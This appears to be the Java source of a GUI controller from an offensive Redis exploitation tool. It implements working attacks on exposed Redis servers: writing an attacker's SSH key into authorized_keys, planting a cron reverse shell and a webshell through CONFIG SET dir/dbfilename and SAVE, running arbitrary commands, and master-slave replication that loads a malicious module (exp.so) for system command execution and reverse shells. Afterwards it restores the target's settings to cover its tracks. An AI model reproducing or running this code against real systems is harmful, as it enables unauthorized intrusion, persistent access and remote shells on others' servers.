package org.fasnow.mutiple.app.ui.controller;

import javafx.application.Platform;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.event.ActionEvent;
import javafx.event.Event;
import javafx.fxml.FXML;
import javafx.scene.control.*;
import javafx.scene.layout.GridPane;
import org.fasnow.mutiple.app.Log;
import org.fasnow.mutiple.app.Utils;
import org.fasnow.mutiple.app.model.redis.FakeServer;
import org.fasnow.mutiple.app.model.redis.Redis;

import javax.rmi.CORBA.Util;
import java.io.IOException;
import java.net.SocketException;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.atomic.AtomicBoolean;

public class RedisController {

    @FXML
    private Button writeWebshellBtn;

    @FXML
    private TextField webpath;

    @FXML
    private TextArea detectLog;

    @FXML
    private Button batchSubmitBtn;

    @FXML
    private TextField cronDirField;

    @FXML
    private TabPane tabs;

    @FXML
    private TextArea description;

    @FXML
    private TextArea cmdExecLog;

    @FXML
    private TextField weshellFilenameField;

    @FXML
    private TextField sshAuthorizedKeysField;

    @FXML
    private TextField reverseShellField;

    @FXML
    private TextField currentUserField;

    @FXML
    private Tab descTab;

    @FXML
    private Button getInfoBtn;

    @FXML
    private TextArea webshellField;

    @FXML
    private TextField dirField;

    @FXML
    private TextField passwordField;

    @FXML
    private Button writeSSHPubkeyBtn;

    @FXML
    private Button reverseShellSubmitBtn;

    @FXML
    private TextField threadField;

    @FXML
    private Button submitBtn;

    @FXML
    private Button setDBFilenameBtn;

    @FXML
    private Button importBtn;

    @FXML
    private TextField hostField;

    @FXML
    private TextArea batchDetectLog;

    @FXML
    private TextArea writeWebshellLog;

    @FXML
    private Button replicationBtn;

    @FXML
    private TextArea replicationLog;

    @FXML
    private GridPane basePanel;

    @FXML
    private TextArea sshPubkeyField;

    @FXML
    private TextField portField;

    @FXML
    private TextArea cronShellLog;

    @FXML
    private TextArea writeSSHPubkeyLog;

    @FXML
    private Button clearReverseShellBtn;

    @FXML
    private Button cmdSubmitBtn;

    @FXML
    private TextField fileField;

    @FXML
    private ComboBox<?> vulCB1;

    @FXML
    private ComboBox<String> localhostCB;

    @FXML
    private Button setDirBtn;

    @FXML
    private TextField dbfilenameField;

    @FXML
    private TextField cmdField;

    @FXML
    private TextField versionField;

    @FXML
    private TextField osNameField;
    
    @FXML
    private TextField localportField;

    private MainController mainController;


    @FXML // This method is called by the FXMLLoader when initialization is complete
    void initialize() {
        //获取网卡IP
        localhostCB.showingProperty().addListener((observable, oldValue, newValue) -> {
            if (newValue) {
                try {
                    localhostCB.setItems(FXCollections.observableList(Utils.getHostAddresses()));
                } catch (Exception e) {
                    replicationLog.appendText(Log.formatStderr(e));
                }

            }
        });


        vulCB1.setVisible(false);
        submitBtn.setVisible(false);
//        tabs.getTabs().remove(2);
//        tabs.getTabs().remove(2);
//        tabs.getTabs().remove(5);
//        List<String> nameList = new ArrayList<>();
//        List<String> descList = new ArrayList<>();
//        for (Map.Entry<String, Vul> entry : Nacos.vuls.entrySet()) {
//            Vul vul = entry.getValue();
//            String vulName= vul.getName();
//            vulNameMethodMap.put(vulName,entry.getKey());
//            nameList.add(0,vulName);
//            descList.add(
//                    "漏洞名称: " + vulName + "\n\n" +
//                            "影响版本: " + vul.getAffectedVersion() + "\n\n" +
//                            "参考链接: " + vul.getRefUrl()
//            );
//        }
//        if(nameList.size()>1){
//            nameList.add(0,"All");
//        }
//        ObservableList<String> observableNames = FXCollections.observableArrayList(nameList);
//        vulCB1.setItems(observableNames);
//        vulCB1.getSelectionModel().selectFirst();
//        description.setText(String.join("\n\n\n",descList));
//
//        ToggleGroup toggleGroup = new ToggleGroup();
//        useAuth.setToggleGroup(toggleGroup);
//        useVul.setToggleGroup(toggleGroup);
//        useToken.setToggleGroup(toggleGroup);
//
//        exportBtn.setVisible(false);
        Utils.setGlobalFocusTraversal(false,basePanel);
    }
    public void setMainController(MainController controller){
        mainController = controller;
    }

    public MainController getMainController(){
        return mainController;
    }

    public void submitBtnAction(Event event){
//        Redis redisInstance = new Redis();
//        String targetUrl = hostField.getText();
//        if("".equals(targetUrl.trim())){
//            return;
//        }
//        try {
//            redisInstance.setTarget(targetUrl);
//        } catch (Exception e) {
//            detectLog.appendText(Log.formatStderr(e));
//            return;
//        }
//        tabs.getSelectionModel().select(1);

    }
    public void batchSubmitBtnAction(Event event) {

    }

    @FXML
    void getInfoBtnAction(ActionEvent event) {
        CompletableFuture.supplyAsync(() -> {
            getInfoBtn.setDisable(true);
            tabs.getSelectionModel().select(1);
            Redis redisInstance = new Redis();
            try {
                preAction(redisInstance,detectLog);
                String redisInfo = redisInstance.getInfo();
                dirField.setText(redisInstance.getDir());
                dbfilenameField.setText(redisInstance.getDBFilename());
                versionField.setText(redisInstance.getVersion(redisInfo));
                osNameField.setText(redisInstance.getOsName(redisInfo));
                detectLog.appendText(Log.formatStdout(redisInfo));
            } catch (Exception e) {
                detectLog.appendText(Log.formatStderr(e));
            } finally {
                postAction(redisInstance);
            }
            return null;
        }).thenAccept(result->{
            getInfoBtn.setDisable(false);
        });

    }

    @FXML
    void clearReverseShellBtnAction(ActionEvent event) {
        CompletableFuture.supplyAsync(() -> {
            String dir = cronDirField.getText();
            String dbFilename = currentUserField.getText();
            Platform.runLater(()->clearReverseShellBtn.setDisable(true));
            try {
                preSetDumpDirAndFilename(dir,dbFilename,cronShellLog,"","");
            } catch (Exception e) {
                Platform.runLater(() ->cronShellLog.appendText(Log.formatStderr(e)));
            }
            return null;
        }).thenAccept(result->{
            Platform.runLater(()->clearReverseShellBtn.setDisable(false));
        });
    }

    private void restoreDumpDirAndFilename(Redis redisInstance,String currentDir, String currentDBFilename, TextArea logArea, String key) throws Exception {
        Platform.runLater(() ->logArea.appendText(Log.formatStdout("正在恢复原状态")));
        if(!"".equals(key)){
            Platform.runLater(() ->logArea.appendText(Log.formatStdout(String.format("删除Key：del %s",key))));
            long fr = redisInstance.delKey(key);
            Platform.runLater(() ->logArea.appendText(Log.formatStdout("删除Key返回结果：" + fr)));
            Thread.sleep(500);
        }
        Platform.runLater(() -> logArea.appendText(Log.formatStdout(String.format("恢复dump目录：config set dir %s",currentDir))));
        String fr1 = redisInstance.setDir(currentDir);;
        Platform.runLater(() -> logArea.appendText(Log.formatStdout("恢复dump目录返回结果："+ fr1)));
        Thread.sleep(500);
        Platform.runLater(() -> logArea.appendText(Log.formatStdout(String.format("恢复dump文件：config set dbfilename %s",currentDBFilename))));
        String fr2 = redisInstance.setDBFilename(currentDBFilename);;
        Platform.runLater(() -> logArea.appendText(Log.formatStdout("恢复dump文件返回结果："+ fr2)));
        Thread.sleep(500);
        Platform.runLater(() -> logArea.appendText(Log.formatStdout("提交更改：save")));
        String fr3 = redisInstance.save();
        Platform.runLater(() -> logArea.appendText(Log.formatStdout("提交更改结果："+fr3)));
    }

    private List<String> setDumpDirAndFilename(Redis redisInstance, TextArea logArea, String dir, String dbFilename, String key, String value) throws Exception {
        List<String> result = new ArrayList<>();
        Platform.runLater(() -> logArea.appendText(Log.formatStdout("获取当前dump目录：config get dir" )));
        String currentDir = redisInstance.getDir();
        result.add(currentDir);
        Platform.runLater(() -> logArea.appendText(Log.formatStdout("当前dump目录：" + currentDir)));
        Thread.sleep(500);
        Platform.runLater(() -> logArea.appendText(Log.formatStdout("获取当前dump文件：config get dbfilename")));
        String currentDBFilename = redisInstance.getDBFilename();
        result.add(currentDBFilename);
        Platform.runLater(() -> logArea.appendText(Log.formatStdout("当前dump文件：" + currentDBFilename)));
        Thread.sleep(500);
        Platform.runLater(() -> logArea.appendText(Log.formatStdout(String.format("设置dump目录：config set dir \"%s\"", dir))));
        String fr1 = redisInstance.setDir(dir);
        Platform.runLater(()  -> logArea.appendText(Log.formatStdout("设置dump目录返回结果：" + fr1)));
        Thread.sleep(500);
        Platform.runLater(() -> logArea.appendText(Log.formatStdout(String.format("设置dump文件：config set dbfilename \"%s\"", dbFilename))));
        String fr2 = redisInstance.setDBFilename(dbFilename);
        Platform.runLater(() -> logArea.appendText(Log.formatStdout("设置dump文件返回结果：" + fr2)));
        Thread.sleep(500);
        if(!"".equals(key)){
            Platform.runLater(() ->logArea.appendText(Log.formatStdout(String.format("设置Key：set %s \"%s\"",key,value.replace("\n","\\n")))));
            String fr = redisInstance.setKey(key,value);
            Platform.runLater(() -> logArea.appendText(Log.formatStdout("设置Key返回结果："+fr)));
            Thread.sleep(500);
        }
        Platform.runLater(() -> logArea.appendText(Log.formatStdout("提交更改：save")));
        String fr3 = redisInstance.save();
        Platform.runLater(() -> logArea.appendText(Log.formatStdout("提交更改返回结果：" + fr3)));
        return result;
    }

    private void preSetDumpDirAndFilename(String dir, String dbfilename, TextArea logArea, String key, String value) throws Exception {
        Redis redisInstance = new Redis();
        try {
            preAction(redisInstance,logArea);
            List<String> dump = setDumpDirAndFilename(redisInstance,logArea,dir,dbfilename,key,value);
            restoreDumpDirAndFilename(redisInstance,dump.get(0),dump.get(1),logArea,key);
        } catch (Exception e) {
            Platform.runLater(() ->logArea.appendText(Log.formatStderr(e)));
        }finally {
            postAction(redisInstance);
        }
    }


    @FXML
    void writeSSHPubkeyBtnAction(ActionEvent event) {
        CompletableFuture.supplyAsync(() -> {
            String dir = sshAuthorizedKeysField.getText();
            String dbfilename = "authorized_keys";
            String value = "\n\n"+sshPubkeyField.getText()+"\n";
            String key = Utils.getRandomString(6);
//            key = "y";
            Platform.runLater(() ->writeSSHPubkeyBtn.setDisable(true));
            try {
                preSetDumpDirAndFilename(dir,dbfilename,writeSSHPubkeyLog,key,value);
            } catch (Exception e) {
                Platform.runLater(() ->writeSSHPubkeyLog.appendText(Log.formatStderr(e)));
            }
            return null;
        }).thenAccept(result->{
            Platform.runLater(()->writeSSHPubkeyBtn.setDisable(false));
        });
    }

    @FXML
    void reverseShellSubmitBtnAction(ActionEvent event) {
        CompletableFuture.supplyAsync(() -> {
            String dir = cronDirField.getText();
            String dbfilename = currentUserField.getText();
            String value = "\n"+reverseShellField.getText()+"\n";
            String key = Utils.getRandomString(6);
//            key = "x";
            Platform.runLater(() -> reverseShellSubmitBtn.setDisable(true));
            try {
                preSetDumpDirAndFilename(dir,dbfilename,cronShellLog,key,value);
            } catch (Exception e) {
                Platform.runLater(() ->cronShellLog.appendText(Log.formatStderr(e)));
            }
            return null;
        }).thenAccept(result->{
            Platform.runLater(()->reverseShellSubmitBtn.setDisable(false));
        });
    }

    @FXML
    void writeWebshellBtnAction(ActionEvent event) {
        CompletableFuture.supplyAsync(() -> {
            String dir = webpath.getText();
            String dbfilename = weshellFilenameField.getText();
            String value = "\n\n"+webshellField.getText()+"\n\n";
            String key = Utils.getRandomString(6);
//            key = "z";
            Platform.runLater(()->writeWebshellBtn.setDisable(true));
            try {
                preSetDumpDirAndFilename(dir,dbfilename,writeWebshellLog,key,value);
            } catch (Exception e) {
                Platform.runLater(() ->writeWebshellLog.appendText(Log.formatStderr(e)));
            }
            return null;
        }).thenAccept(result->{
            Platform.runLater(()->writeWebshellBtn.setDisable(false));
        });
    }

    @FXML
    void cmdSubmitBtnAction(ActionEvent event) {
        CompletableFuture.supplyAsync(() -> {
            String cmd = cmdField.getText();
            String[] fields = Utils.fields(cmd);
            Platform.runLater(()->cmdSubmitBtn.setDisable(true));
            Redis redisInstance = new Redis();
            try {
                preAction(redisInstance,cmdExecLog);
                Platform.runLater(()->cmdExecLog.appendText(Log.formatStdout(String.join(" ",fields))));
                String result = redisInstance.exec(cmd);
//                List<String> r = redisInstance.execRedisCommand(cmd);
//                r.forEach(System.out::println);
                Platform.runLater(()->cmdExecLog.appendText(Log.formatStdout(result)));
            } catch (Exception e) {
                Platform.runLater(()->cmdExecLog.appendText(Log.formatStderr(e)));
            } finally {
                postAction(redisInstance);
            }
            return null;
        }).thenAccept(result->{
            Platform.runLater(()->cmdSubmitBtn.setDisable(false));
        });
    }

    @FXML
    void replicationBtnAction(ActionEvent event) {
        String helpInfo = "请到Redis命令执行模块执行命令：\nsystem.exec <shell_cmd> 执行系统命令\nsystem.rev <host> <port> 反弹shell\nmodul unload system 卸载恶意模块";

        String lhost = localhostCB.getSelectionModel().getSelectedItem();
        int lport = Integer.parseInt(localportField.getText());
        String rhost = hostField.getText();
        int rport = Integer.parseInt(portField.getText());
        String password = passwordField.getText();
        byte[] payload = FakeServer.readBinaryResource("redis/exp.so");
        CompletableFuture.runAsync(()->{
            replicationBtn.setDisable(true);
            FakeServer  fakeServer = null;
            try {
                fakeServer = new FakeServer(lhost,lport,rhost,rport,password,payload);
                Redis redis = fakeServer.getRedis();
                if(redis==null){
                    Platform.runLater(()->replicationLog.appendText(Log.formatStderr("无法连接至目标redis")));
                    replicationBtn.setDisable(false);
                    return;
                }
                fakeServer.listen();
                FakeServer finalServer = fakeServer;
                CompletableFuture.runAsync(()-> {
                    try {
                        finalServer.handleAccept();
                    } catch (Exception e) {
                        if(!finalServer.successExited()){
                            Platform.runLater(()->replicationLog.appendText(Log.formatStderr(e)));
                            e.printStackTrace();
                        }
                    }
                });
                System.out.println("Server is listening on " + lhost + ":" + lport);
                Platform.runLater(()->replicationLog.appendText(Log.formatStdout("Server is listening on " + lhost + ":" + lport)));

                //获取当前module list
                Platform.runLater(()->replicationLog.appendText(Log.formatStdout("获取当前模块列表...")));
                String fr = redis.exec("module list");
                Platform.runLater(()->replicationLog.appendText(Log.formatStdout(fr)));
                if(fr.contains("system")){
                    Platform.runLater(()->replicationLog.appendText(Log.formatStdout("已有system模块\n"+helpInfo)));
                    return;
                }

                //获取当前备份文件名
                Platform.runLater(()->replicationLog.appendText(Log.formatStdout("config get dbfilename")));
                String dbfilename = redis.getDBFilename();
                Platform.runLater(()->replicationLog.appendText(Log.formatStdout(dbfilename)));
                //设置备份文件名
                String t = Utils.getRandomString(8)+".so";
                Platform.runLater(()->replicationLog.appendText(Log.formatStdout("config set  dbfilename "+t)));
                String fr1 = redis.getJedis().configSet("dbfilename",t);
                Platform.runLater(()->replicationLog.appendText(Log.formatStdout(fr1)));
                //设置主从模式
                Platform.runLater(()->replicationLog.appendText(Log.formatStdout(String.format("slaveof %s %s",lhost,lport))));
                String fr2 = redis.getJedis().replicaof(lhost,lport);
                Platform.runLater(()->replicationLog.appendText(Log.formatStdout(fr2)));
                //使之有足够的时间去复制数据
                Thread.sleep(2000);
                //加载恶意模块
                Platform.runLater(()->replicationLog.appendText(Log.formatStdout("module load "+"./"+t)));
                String fr3 =redis.getJedis().moduleLoad("./"+t);
                Platform.runLater(()->replicationLog.appendText(Log.formatStdout(fr3)));
                //脱离主机点
                Platform.runLater(()->replicationLog.appendText(Log.formatStdout("正在恢复...")));
                Platform.runLater(()->replicationLog.appendText(Log.formatStdout("slaveof no one")));
                String fr4 =redis.getJedis().replicaofNoOne();
                Platform.runLater(()->replicationLog.appendText(Log.formatStdout(fr4)));
                //恢复备份文件
                Platform.runLater(()->replicationLog.appendText(Log.formatStdout("config set  dbfilename "+dbfilename)));
                String fr5 = redis.setDBFilename(dbfilename);
                Platform.runLater(()->replicationLog.appendText(Log.formatStdout(fr5)));
                Platform.runLater(()->replicationLog.appendText(Log.formatStdout(helpInfo)));
            } catch (Exception e) {
                Platform.runLater(()->replicationLog.appendText(Log.formatStderr(e)));
            }finally {
                replicationBtn.setDisable(false);
                try {
                    // 关闭服务器端套接字
                    if (fakeServer != null) {
                        fakeServer.close();
                    }
                }  catch (IOException e) {
                    Platform.runLater(()->replicationLog.appendText(Log.formatStderr(e)));
                }
            }
        });
    }

    void preAction(Redis client,TextArea logArea) throws Exception {
        String host = hostField.getText();
        int port = Integer.parseInt(portField.getText());
        String password = passwordField.getText();
        client.connect(host,port,password,10*1000);
        if(!client.isConnected()){
            logArea.appendText(Log.formatStderr("无法连接"));
        }
    }

    void postAction(Redis client){
        if(client.isConnected()){
            client.close();
        }
    }

    List<String> targets = new ArrayList<>();
    public void importBtnAction(Event event){
        Map<String,List<String>> result = Utils.getTargetUrls();
        for (Map.Entry<String,List<String>> entry:
                result.entrySet()) {
            String filename = entry.getKey();
            if("".equals(filename)){
                return;
            }
            fileField.setText(filename);
            targets =  entry.getValue();
        }
        System.out.println(fileField.getText());
        if(targets.size()==0){
            batchDetectLog.appendText(Log.formatStderr(new Exception("目标不能为空")));
        }
    }
}
